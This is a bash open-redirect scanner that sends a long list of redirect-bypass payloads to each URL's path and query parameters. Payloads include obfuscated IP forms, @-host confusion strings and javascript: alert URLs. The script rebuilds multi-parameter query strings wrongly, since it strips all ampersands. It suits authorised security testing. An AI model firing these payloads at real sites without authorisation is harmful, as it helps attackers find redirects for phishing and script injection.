#!/bin/bash
# Script takes a number of URLs and attempts to check them for open-redirect using www.example.com
# as base, aka the payload is provided and if the example.com content seen in response, then it will 
# be assumed that open-redirect vulnerability is present.
#
# Script typically utilises curl, grep to determine if the open-redirect vulnerability is present
# 
# It will first attach payloads first to the full path to look for redirected page. After that, 
# it will attempt to attach the payload to each query string.
# 
# The payloads list has been taken from: 
#     https://github.com/payloadbox/open-redirect-payload-list
# 
# Input:
#     Multiple URLs, one on each line
# 
# Args:
#     verbose: This flag can be provided for debugging by setting to 1. By default, set to 1. To
#              stop, simply enter 0.
# 
# Output:
#     Vulnerable URLs, if found
# 
# Examples:
#    To check vulnerable URLs in list urls.txt, run the command:
#        cat urls.txt | ./open_redirect_checker.sh 
# 
#    To check multiple URLs in parallel, run the command:
#        alias pparallel='parallel --will-cite -n1 --pipe '
#        cat in-urls.txt | pparallel ./open_redirect_checker.sh 1
#

# Payloads to use for testing - Add any new payloads here
PAYLOADS="
http://www.example.com
www.example.com
https://www.example.com
#www.example.com
#http://www.example.com
#https://www.example.com
/%09/example.com
/%2f%2fexample.com
/%5cexample.com
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
///example.com/%2e%2e
///example.com/%2e%2e%2f
///example.com/%2f%2e%2e
///example.com/%2f..
///example.com//
//example.com
//example.com/
//example.com/%2e%2e
//example.com/%2e%2e%2f
//example.com/%2f%2e%2e
//example.com/%2f..
//example.com//
//https:///example.com/%2e%2e
//https://example.com/%2e%2e%2f
//https://example.com//
/<>//example.com
/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
/\/\/example.com/
/\/example.com/
/example.com/%2f%2e%2e
/http://example.com
/http:/example.com
/https:/%5cexample.com/
/https://%09/example.com
/https://%5cexample.com
/https:///example.com/%2e%2e
/https:///example.com/%2f%2e%2e
/https://example.com
/https://example.com/
/https://example.com/%2e%2e
/https://example.com/%2e%2e%2f
/https://example.com/%2f%2e%2e
/https://example.com/%2f..
/https://example.com//
/https:example.com
/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
//example.com@google.com/%2f..
///example.com@google.com/%2f..
////example.com@google.com/%2f..
https://example.com@google.com/%2f..
/https://example.com@google.com/%2f..
//example.com@google.com/%2f%2e%2e
///example.com@google.com/%2f%2e%2e
////example.com@google.com/%2f%2e%2e
https://example.com@google.com/%2f%2e%2e
/https://example.com@google.com/%2f%2e%2e
//example.com@google.com/
///example.com@google.com/
////example.com@google.com/
https://example.com@google.com/
/https://example.com@google.com/
//example.com@google.com//
///example.com@google.com//
////example.com@google.com//
https://example.com@google.com//
//https://example.com@google.com//
//example.com@google.com/%2e%2e%2f
///example.com@google.com/%2e%2e%2f
////example.com@google.com/%2e%2e%2f
https://example.com@google.com/%2e%2e%2f
//https://example.com@google.com/%2e%2e%2f
///example.com@google.com/%2e%2e
////example.com@google.com/%2e%2e
https:///example.com@google.com/%2e%2e
//example.com@https:///google.com/%2e%2e
/https://example.com@google.com/%2e%2e
///example.com@google.com/%2f%2e%2e
////example.com@google.com/%2f%2e%2e
https:///example.com@google.com/%2f%2e%2e
/https://example.com@google.com/%2f%2e%2e
/https:///example.com@google.com/%2f%2e%2e
/%09/example.com@google.com
//%09/example.com@google.com
///%09/example.com@google.com
////%09/example.com@google.com
https://%09/example.com@google.com
/%5cexample.com@google.com
//%5cexample.com@google.com
///%5cexample.com@google.com
////%5cexample.com@google.com
https://%5cexample.com@google.com
/https://%5cexample.com@google.com
https://example.com@google.com
https://example.com/https://google.com/
javascript://example.com?%a0alert%281%29
http://example.com@0xd8.0x3a.0xd6.0xce
http://example.com@0xd83ad6ce
http://example.com@3627734734
http://example.com@472.314.470.462
http://example.com@0330.072.0326.0316
http://example.com@00330.00072.0000326.00000316
http://example.com@[::216.58.214.206]
http://example.com@[::ffff:216.58.214.206]
http://example.com@0xd8.072.54990
http://example.com@0xd8.3856078
http://example.com@00330.3856078
http://example.com@00330.0x3a.54990
http:example.com@0xd8.0x3a.0xd6.0xce
http:example.com@0xd83ad6ce
http:example.com@3627734734
http:example.com@472.314.470.462
http:example.com@0330.072.0326.0316
http:example.com@00330.00072.0000326.00000316
http:example.com@[::216.58.214.206]
http:example.com@[::ffff:216.58.214.206]
http:example.com@0xd8.072.54990
http:example.com@0xd8.3856078
http:example.com@00330.3856078
http:example.com@00330.0x3a.54990
//google.com\@example.com
https://:@google.com\@example.com
http://google.com:80#@example.com/
http://google.com:80?@example.com/
http://3H6k7lIAiqjfNeN@example.com+@google.com/
http://XY>.7d8T\205pZM@example.com+@google.com/
http://3H6k7lIAiqjfNeN@example.com@google.com/
http://XY>.7d8T\205pZM@example.com@google.com/
http://example.com+&@google.com#+@example.com/
http://google.com\texample.com/
//google.com:80#@example.com/
//google.com:80?@example.com/
//3H6k7lIAiqjfNeN@example.com+@google.com/
//XY>.7d8T\205pZM@example.com+@google.com/
//3H6k7lIAiqjfNeN@example.com@google.com/
//XY>.7d8T\205pZM@example.com@google.com/
//example.com+&@google.com#+@example.com/
//google.com\texample.com/
javascript://https://example.com/?z=%0Aalert(1)
http://google.com%2f%2f.example.com/
http://google.com%5c%5c.example.com/
http://google.com%3F.example.com/
http://google.com%23.example.com/
http://example.com:80%40google.com/
http://example.com%2egoogle.com/
"

# User agent to use for testing
USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"

# Unique Regex related to example.com to search for vulnerability - if found in response, then 
# vulnerability discovered
VULNERABLE_REGEX="this domain is for use in illustrative examples"

# Print verbose/debug messages
verbose=${1:-"1"}

function get_url_wo_query_str {
    # Function gets the URL without the query string
    # 
    # Args:
    #     url: URL to parse
    # 
    # Output:
    #     URL without query string
    # 
    # Examples:
    #     To get www.google.com/test.txt from url: www.google.com/test.txt?test=1
    #         get_url_wo_query_str 'www.google.com/test.txt?test=1'
    #
    local url="${1}"

    echo "$url" | cut -d"?" -f1
    
}

function get_query_str_params_from_url { 
    # Function returns the query string parameters (including ? and =)
    # 
    # Args:
    #     url: URL to get the query string parameters
    # 
    # Output:
    #     query string parameters found, one on each line
    # 
    # Examples:
    #     To get the query string parameters from URL, www.google.com?test=1&test=2
    #         get_query_str_params_from_url "www.google.com?test=1&test=2"
    #     
    # 
    local url="${1}"
    does_contain_query_str=$(echo "$url" | grep -i "?")
    if [ ! -z "$does_contain_query_str" ]; then
        echo "$url" | cut -d"?" -f2 | tr -s "&" "\n"
    fi
}

function debug {
    # Print the debug message if verbose flag is set
    # 
    # Args:
    #     msg: Message to print
    # 
    # Output: 
    #     print output message
    # 
    # Examples:
    #     To print 'test message', 
    #         debug 'test message'
    local msg="$1"
    if [ "$verbose" == "1" ]; then
        echo "[*] $msg"
    fi
}

function test_url_for_open_redirect {
    # Check if the URL is vulnerable to open redirect, if vulnerable regex found in output then
    # it is vulnerable
    # 
    # Args:
    #     url_to_test: URL to test for open redirect
    #
    # Outputs:
    #     Returns 1 if URL is vulnerable to open redirect, else return 0
    #
    local url_to_test="$1"

    local return_val=0

    if [ ! -z "$url_to_test" ]; then
        # Build a temp file to write the output
        outfile=$(mktemp -u)
    
        # Make the web request to get the output
        curl -s -k -L -A "$USER_AGENT" "$url_to_test" -o "$outfile"

        # Check if vulnerable by using regex for validation
        regex_found=$(grep -i "$VULNERABLE_REGEX" "$outfile")
        if [ ! -z "$regex_found" ]; then
            return_val=1
        fi

        # Remove the output file
        rm "$outfile"
    fi
    echo "$return_val"
}



# Read the URLs from user to check
urls=$(cat -)

# Loop through each url provided
IFS=$'\n'
for url in $urls; do
    debug "Testing URL: $url"

    # Get the URL without query string and query params for testing
    url_wo_query_str=$(get_url_wo_query_str "$url")
    query_str_params=$(get_query_str_params_from_url "$url")
    num_query_str_params=$(echo $query_str_params | grep -c '')

    debug "Number of query string parameters for url: $url are: $num_query_str_params"

    # Test URL without the query string
    IFS=$'\n'
    for payload in $PAYLOADS; do
        if [ ! -z "$payload" ]; then

            # Build the url to test - by putting the payload 
            url_to_test="$url_wo_query_str/$payload"

            # Test if the URL is vulnerable
            debug "Testing URL: $url_to_test for open redirect bypass"
            is_vulnerable=$(test_url_for_open_redirect "$url_to_test")
            if [ "$is_vulnerable" == "1" ]; then
                echo "[+] Found Vulnerable URL: $url_to_test"
            fi

        fi
    done

    # Loop through each query string parameter set
    IFS=$'\n'
    for query_str_param in $query_str_params; do
        
        # Only review query parameters that are not empty
        if [ ! -z "$query_str_param" ]; then

            # Get the Key from the query string set
            query_str_param_key=$(echo "$query_str_param" | cut -d"=" -f1)
            
            IFS=$'\n'
            for payload in $PAYLOADS; do
                if [ ! -z "$payload" ]; then
                    
                    # Replace the payload in a single and join all the params together
                    query_str_params_sub=$(echo "$query_str_params" \
                                        | sed -E "s|$query_str_param_key=.*|$query_str_param_key=$payload|g" \
                                        | tr -s "\n" "&" \
                                        | sed -E "s/&//g")

                    # Build the URL to test
                    url_to_test="$url_wo_query_str?$query_str_params_sub"
                    
                    # Test if the URL is vulnerable
                    debug "Testing URL: $url_to_test for open redirect bypass"
                    is_vulnerable=$(test_url_for_open_redirect "$url_to_test")
                    if [ "$is_vulnerable" == "1" ]; then
                        echo "[+] Found Vulnerable URL: $url_to_test"
                    fi
                fi
            done
        fi

    done
done
